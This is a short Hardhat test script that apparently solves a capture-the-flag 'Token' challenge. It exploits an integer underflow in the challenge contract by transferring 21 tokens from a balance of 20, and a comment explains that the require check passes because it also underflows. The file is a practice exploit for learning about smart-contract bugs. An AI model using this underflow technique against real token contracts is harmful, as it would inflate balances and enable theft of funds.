import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Token", function () {
    let signer: Signer;
    let myAddress: string;
    let challenge_instance_address = "0x4501B8B74585fb6b475294c32C41c620474fffb2";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        myAddress = await signer.getAddress();
        console.log("Primary Signer Address:", myAddress);
        challengeFactory = await ethers.getContractFactory("Token");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        const tokenCount = await challenge.balanceOf(myAddress) as BigNumber;
        console.log("Current Token Count: ", tokenCount.toNumber());
        const transferTx = await challenge.transfer(challenge.address, 21); // We have 20 to begin with, we transfer 21 to underflow. The require will pass as well, since it will also underflow.
        const receipt = await transferTx.wait();
        const newTokenCount = await challenge.balanceOf(myAddress) as BigNumber;
        console.log("New Token Count: ", newTokenCount.toNumber());
        expect(newTokenCount.toString()).not.to.equal(tokenCount.toString());
    });


});
